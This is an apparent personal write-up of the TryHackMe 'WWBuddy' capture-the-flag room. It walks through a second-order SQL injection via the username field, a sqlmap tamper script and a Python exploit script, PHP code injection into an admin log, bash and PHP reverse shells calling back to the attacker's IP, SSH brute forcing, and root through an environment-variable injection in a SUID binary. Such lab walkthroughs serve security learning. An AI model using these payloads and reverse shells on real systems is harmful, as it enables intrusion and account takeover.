# Tryhackme.com Room : WWBuddy
`https://tryhackme.com/room/wwbuddy`


# Instance
```
export IP=10.10.72.11
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 66:75:21:b4:93:4a:a5:a7:df:f4:01:80:19:cf:ff:ad (RSA)
|   256 a6:dd:30:3b:e4:96:ba:ab:5f:04:3b:9e:9e:92:b7:c0 (ECDSA)
|_  256 04:22:f0:d2:b0:34:45:d4:e5:4d:ad:a2:7d:cd:00:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.196.165/login/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got a website running on port `80`.
We are greeted by a login page.
We can create an account on this page.

While exploring the website, we are running gobuster to find interesting paths

We create a dummy account
```
john:password
```

On the website, there is a chatbox. Doesn't seem to be vulnerable to `XSS`.

To send a message, the website does a post on `/api/message` with these parameters :
```
sendto: 7aa2ac7d8e7e46085fc46d2ab408999a
message: "waddup"
```

To retrieve the message, `GET` on `http://10.10.196.165/api/messages/?uid=7aa2ac7d8e7e46085fc46d2ab408999a`

Each request have a cookie with
```
PHPSESSID   jhl8f04i2l9703dr6pomae5909
```

We can modify a bunch of attributes in the profile but none lead to `XSS` and i also tried placing `'` everywhere but didn't get any failure so far.

Actually, just found it !
on `/change` which is the url to change the password, when I use `' or 1=1` as password I get
```
Something Went Wrong
```

This is most probably the vulnerable point.

```bash
sqlmap -u http://$IP/change/ --data "password=password&new_password=" --cookie "PHPSESSID=jhl8f04i2l9703dr6pomae5909"
```

So I was wrong, the injectable parameter is not `new_password`.
When I tested the password change, I had leftovers from previous test.
My username was `john'` and it is the quote in my username that triggered the sql injection.

This is a 2 steps attack.

Let's try to make this work with sqlmap

I found those 2 links that were pretty useful:
```
https://0xdf.gitlab.io/2018/07/07/second-order-sql-injection-on-htb-nightmare.html
https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap
```

```
sqlmap --tamper tamper_change_name.py -u http://$IP/change/ --data "password=password&new_password=password&pwn=" --cookie "PHPSESSID=i99deh2eroi70pederj7h4s9jj"
```

Tamper script
```py
#!/usr/bin/env python3

import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

IP="10.10.196.165"
SESSION_ID="jhl8f04i2l9703dr6pomae5909"

def dependencies():
    pass

def change_name(payload):
    s = requests.Session()

    req_data = {
        "username":payload,
        "country":"Afghanistan",
        "email":"user@pwn.com",
        "birthday":"2020-11-02",
        "description":""
    }

    cookie = {'PHPSESSID': SESSION_ID}

    response = s.post(f"http://{IP}/", data=req_data, cookies=cookie)

    return payload

def tamper(payload, **kwargs):
    change_name(payload)
    return payload
```

Exploit script
```py
#!/usr/bin/env python3

import requests
import argparse

parser = argparse.ArgumentParser('Experiment Runner')
parser.add_argument("--ip", type=str, default="10.10.72.11", help="Server ip")
parser.add_argument("--session_id", type=str, default="43ms4o2sedrgv2g3jtc259u3og", help="Session Id")
parser.add_argument("--name", type=str, required=True, help="Name to be set (Exploited parameter)")
parser.add_argument("--current_password", type=str, default="password", help="Current password")
parser.add_argument("--new_password", type=str, default="password", help="New password")
parser.add_argument("--name_only", action="store_true", help="Won't change the account password")

# TODO : Create account so we don't have to supply session id ?

def change_name(args):
    req_data = {
        "username":args.name,
        "country":"Afghanistan",
        "email":"user@pwn.com",
        "birthday":"2020-11-02",
        "description":""
    }

    cookie = {'PHPSESSID': args.session_id}

    print(f"Changing username to {args.name}")

    r = requests.post(f"http://{args.ip}/", data=req_data, cookies=cookie)

    if ' <span class="help-block"></span>' not in r.text:
        print("Error while changing name :")
        print(r.text.split('<div class="error has-error">')[-1].split('</div>')[0])
        return False

    return True


def change_password(args):
    req_data = {
        'password': args.current_password,
        'new_password': args.new_password
    }
    cookie = {'PHPSESSID': args.session_id}

    print("Changing password")

    r = requests.post(f"http://{args.ip}/change/", data=req_data, cookies=cookie)
    
    # Hacky way of carving out the data
    status = r.text.split('<div class="alert')[-1].split('<form ')[0]

    if "successfully" in status:
        print("Password changed")
        return True
    else:
        print("There was a problem")
        print(status)
        return False


if __name__ == "__main__":
    args = parser.parse_args()
    if change_name(args) and not args.name_only:
        change_password(args)
```



Looking at the html, i found this :
```
var users = {"fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy"};
            var uid = "e76fae683aca793df9f141c39cad6c3e";
```

which suggest that the `WWBuddy` account is linked to a real account (maybe the admin ?)
We can potentially change the password for `WWBuddy` somehow.
Maybe with truncation ? There is a hard limit when setting the username tho (50 characters)
Or maybe using `and uid=...` not sure.

Hmmm we get an error when running this `python3 expl.py --name "us' and USER.uid='e76fae683aca793df9f141c39cad6c3e"`
```
Changing username to us' and USER.uid='e76fae683aca793df9f141c39cad6c3e
Error while changing name :

        <span class="help-block">Username error: This username is already taken.</span>
        <button class="editBtn" type="button" onclick="showPage()">Edit Info</button>
```

Hmmmm actually, can't reproduce this :/

Seems to be case sensitive.

Took a break and came back to this about a week later.

It was actually pretty easy to exploit. We can change the name of the admin account `WWBuddy` using this
```
python3 expl.py --name "WWBuddy' or '1'='1"
```

Which will select the user `WWBuddy` and change the password to `password`.

Now we can see other users :
```

var users = {
    "be3308759688f3008d01a7ab12041198":"Henry",
    "b5ea6181006480438019e76f8100249e":"Roberto",
    "fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy",
    "6ccb34104a9f9b136c8d6ccbd8450d71":"WWBuddy' or '1'='1"};
```

Hmmm, we still don't have access to `/admin`. I'm guessing that it's either `Henry` or `Roberto`.

Let's change their password with
```
python3 expl.py --name "Henry' or '1'='1"
python3 expl.py --name "Roberto' or '1'='1"
```

The description of `Roberto` account is 
```
I'm a Brazilian guy who likes to write code, full stack developer working for WWBuddy, open for new friendships :D
```

It's birthday is :
```
04/14/1995
```

Which indicate that he is a programmer.

Still don't have access to `/admin`

In the chat log we find :
```
Hey dude    
    ?
Well, i think you should change the default password for our accounts in SSH, the employee birthday isn't a secure password :p
    haven't you changed yours?
I did, but maybe in the future when you hire more people this can be a problem
    I'll look into it
    

Sooo, will you hire that girl i was talking about?
    yeah, she seems good
:DDDDD
She'll be sooo happy when she finds out!!
```

Let's get into `Henry` account.

We finally get into the `/admin` which shows :
```
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
10.6.32.20 2020-11-28 19:23:20 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
10.6.32.20 2020-11-28 19:29:35 Roberto b5ea6181006480438019e76f8100249e 
```

In the comments of `/admin`, we find the first flag :
```
THM{d0nt_try_4nyth1ng_funny}
```


`10.6.32.20` is our ip but `192.168.0.139` look like a local ip. Maybe there is another box that we can hop on once we get access to the ssh accounts ?


OR maybe we can inject something in there using our username. I guess there are unauthorized access to `/admin`

Yeppp, we can add some lines :
```
10.6.32.20 2020-11-28 19:40:04 Roberto' or '1'='1 6ccb34104a9f9b136c8d6ccbd8450d71 
```

By changing our name to `<?php echo "PWNED"; ?>`, we see that we get code execution.

We can then get a php reverse shell. Lets try
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.20/7777 0>&1'");
```

Hmm it's a bit tricky to enter this in the shell as a parameter with all the quotes... let's write it to a file and cat it as a parameter. Maybe this will work ?

```
python3 expl.py --name_only --name "$(cat expl_name)"
```

Hmmmmm.... dammnit, the user can't be more than 50 characters...

We can work around this by creating our cmd in parts.
Luckily for us, the current user name is written to the unauthorized log but doesn't change when we change our name. We get something like :
```
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
10.6.32.20 2020-11-28 19:23:20 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
10.6.32.20 2020-11-28 19:29:35 Roberto b5ea6181006480438019e76f8100249e
10.6.32.20 2020-11-28 19:40:04 Roberto' or '1'='1 6ccb34104a9f9b136c8d6ccbd8450d71
10.6.32.20 2020-11-28 19:42:22 PWNED 6ccb34104a9f9b136c8d6ccbd8450d71 
```

We could concatenate a string in multiple lines and get the same command as before.
OR we could write it in php with 
```
$sock=fsockopen("10.6.32.20",7777);
exec("/bin/sh -i <&3 >&3 2>&3");
```
```
python3 expl.py --name_only --name '<?php $sock=fsockopen("10.6.32.20",7777); ?>'
```

Then visit `/admin` with our underpriviledge account.

```
python3 expl.py --name_only --name '<?php exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
```

Then again, visit `/admin` with our underpriviledge account.

Finally we go to `/admin` with the admin account `Henry`

Hmmmm, we get a connection on our box but it is closed as soon as it is opened.

Maybe we can try another way.

Let's concatenate the exec command
```
<?php $c="/bin/bash -c 'bash -i >& "; ?>
<?php $c=$c."/dev/tcp/10.6.32.20/8888 0>&1'"; ?>
<?php exec($c);
```

```
python3 expl.py --name_only --name '<?php $c="/bin/bash -c \'bash -i >& "; ?>'
python3 expl.py --name_only --name '<?php $c=$c."/dev/tcp/10.6.32.20/8888 0>&1\'"; ?>'
python3 expl.py --name_only --name '<?php exec($c); ?>'
```

Again, to go around quotes issues without hassle, I just did
```
python3 expl.py --name_only --name "$(cat name)"
```

And we got a shell.

In home we find :
```
www-data@wwbuddy:/home$ ls -la
total 20
drwxr-xr-x  5 root    root    4096 Jul 28 17:49 .
drwxr-xr-x 23 root    root    4096 Jul 25 14:53 ..
drwx------  2 jenny   jenny   4096 Jul 27 21:44 jenny
drwx------  3 roberto roberto 4096 Jul 27 21:25 roberto
drwx------  6 wwbuddy wwbuddy 4096 Jul 28 17:39 wwbuddy
```

In the chat, it is mentionned that the default credentials are the date of birth. `Roberto` has changed it but probably not `jenny`

Hmmm, doesn't seems to be a `jenny` user on the website (We could have easily retrieved her birthdate this way).

Hmmm, maybe we can bruteforce it, but not sure of the format.. The age should be near `roberto` since he talk about her in the chat.
```
roberto birthday : 04/14/1995
```

Let's check in the database if there is a mention somewhere.
Looking at `/var/www/html/config.php` we get:
```
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'password123');
define('DB_NAME', 'app');
```

Looking in the db, can confirm that there is nothing there...

Maybe we really are supposed to bruteforce jenny birthdate and the password format..

Let's run linpeas while we prepare the bruteforce.

linpeas didn't find anything useful.

We generate dated from `1990` to `2000` using this little python loop :
```
for year in range(1990, 2000):
    for month in range(1,13):
        for day in range(1,32):
            print(f"{day:02}{month:02}{year}")
            print(f"{day:02}{month:02}{str(year)[-2:]}")
```

We pipe the result to a file that will be used by patator to bruteforce `jenny` ssh password.

The bruteforce is quite slow tho (5 request/seconds for 7440 requests)... I might have exagerated on the date range. Should have tested the year `1995` first. 
We'll let this run and we'll see.

Hmm so we didn't find it with this format (We stoped at `98`... maybe we need `/` ?

```
for year in range(1995, 2000):
    for month in range(1,13):
        for day in range(1,32):
            print(f"{day:02}/{month:02}/{year}")
            print(f"{day:02}/{month:02}/{str(year)[-2:]}")
```

Ok sooo, i decided to take a look a some write up.
They mentioned a log file that is brought up by linpeas 
```
cat /var/log/mysql/general.log
/usr/sbin/mysqld, Version: 5.7.30-0ubuntu0.18.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
2020-07-25T14:35:56.331972Z         6 Query     show global variables where Variable_Name like "%general%"
2020-07-25T14:36:04.753758Z         6 Quit
2020-07-25T14:41:25.299513Z         8 Connect   root@localhost on  using Socket
2020-07-25T14:41:25.299556Z         8 Connect   Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.309432Z         9 Connect   root@localhost on  using Socket
2020-07-25T14:41:25.309467Z         9 Connect   Access denied for user 'root'@'localhost' (using password: YES)
2020-07-25T14:41:25.317881Z        10 Connect   root@localhost on  using Socket
2020-07-25T14:41:25.317916Z        10 Connect   Access denied for user 'root'@'localhost' (using password: NO)
2020-07-25T14:56:02.127981Z        11 Connect   root@localhost on app using Socket
2020-07-25T14:56:02.128534Z        11 Quit
2020-07-25T15:01:40.140340Z        12 Connect   root@localhost on app using Socket
2020-07-25T15:01:40.143115Z        12 Prepare   SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:01:40.143760Z        12 Execute   SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68w
2020-07-25T15:01:40.147944Z        12 Close stmt
2020-07-25T15:01:40.148109Z        12 Quit
2020-07-25T15:02:00.018314Z        13 Connect   root@localhost on app using Socket
2020-07-25T15:02:00.018975Z        13 Prepare   SELECT id, username, password FROM users WHERE username = ?
2020-07-25T15:02:00.019056Z        13 Execute   SELECT id, username, password FROM users WHERE username = 'Roberto'
2020-07-25T15:02:00.089575Z        13 Close stmt
2020-07-25T15:02:00.089631Z        13 Quit
2020-07-25T15:02:00.093503Z        14 Connect   root@localhost on app using Socket
2020-07-25T15:02:00.093662Z        14 Query     SELECT name FROM countries
2020-07-25T15:02:00.094135Z        14 Query     SELECT country, email, birthday, description FROM users WHERE id = 'b5ea61810064
2020-07-25T15:02:00.096687Z        14 Query     SELECT * FROM messages WHERE sender = 'b5ea6181006480438019e76f8100249e' OR rece
2020-07-25T15:02:00.097056Z        14 Query     SELECT id,username FROM users WHERE id IN ('fc18e5f4aa09bbbb7fdedf5e277dda00', '
2020-07-25T15:02:00.097174Z        14 Quit
2020-07-25T15:06:48.352118Z        15 Connect   root@localhost on app using Socket
2020-07-25T15:06:48.352492Z        15 Quit
```

Roberto probably mistyped and inputed its password: `yVnocsXsf%X68wf`

Now we can login in ssh and we find the flag in `/home/roberto/importante.txt`
```
A Jenny vai ficar muito feliz quando ela descobrir que foi contratada :DD

Não esquecer que semana que vem ela faz 26 anos, quando ela ver o presente que eu comprei pra ela, talvez ela até anima de ir em um encontro comigo.


THM{g4d0_d+_kkkk}
```

User Flag :
```
THM{g4d0_d+_kkkk}
```

The message translated is :
```
Jenny will be very happy when she finds out she was hired: DD

Do not forget that next week she turns 26, when she sees the gift I bought for her, maybe she even encourages to go on a date with me.
```

The file date is `Jul 27 2020` -> `27/07/2020`

She is born in `1994`. Damnn... should have runned the bruteforce starting in `1994`...

Next week is the begining of august, so she is born in the first week of august 1994. `01/08/1994`

Damnnn you Americanss !! Why the format `MM/DD/YYYY` ....

After a lot of modification to the format and a lot of bruteforce scan, we find the password for `jenny`

```
jenny:08/03/1994
```

We're in jenny but doesn't seem to have much in here..

Running linpeas again from `jenny`. I looked more into the users and found :
```
uid=1000(wwbuddy) gid=1000(wwbuddy) groups=1000(wwbuddy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(roberto) gid=1001(roberto) groups=1001(roberto),200(developer)
uid=1002(jenny) gid=1002(jenny) groups=1002(jenny)
```

Maybe we can do something with the `developer` group ? Seems like its just access to `/var/www/html`...

But i guess we need access to `wwbuddy` to get `sudo` or maybe exploit `lxd` container ?

Seems like we can write to `/var/lib/lxcfs` is this useful ?

```
/dev/disk/by-uuid/ad9253b4-2982-4fac-9ccb-8358457bed60  /       ext4    defaults        0 0
```



Soooooo, reading more the write up, I found out about `/bin/authenticate` which is runned as suid and grant the `developer`  group to the current user.

It was there in the linpeas log... just didn't see it...

In the write up they pop up ghidra and disasemble the binary.

Welll, maybe we can figure a way without disassembling. 
Dumping the `strings`, we find the following interesting strings :
```
setuid
getenv
system
getuid
usermod H
-G develH
You need to be a real user to be authenticated.
groups | grep developer
You are already a developer.
USER
Group updated
newgrp developer
```

So i think its calling `system('usermod $USER -G developer')`.

Let's see what happen if we modify `USER`

if I run `export USER=test` i get
```
usermod: user 'test' does not exist
Group updated
```

If we set `export USER="pwn ; id" && authenticate` :
```
uid=0(root) gid=1002(jenny) groups=1002(jenny)
```

Then if we do `export USER="pwn ; /bin/bash" && authenticate`

We get a root shell.

And the root flag `/root/root.txt`
```
THM{ch4ng3_th3_3nv1r0nm3nt}
```

Anddd it's done.

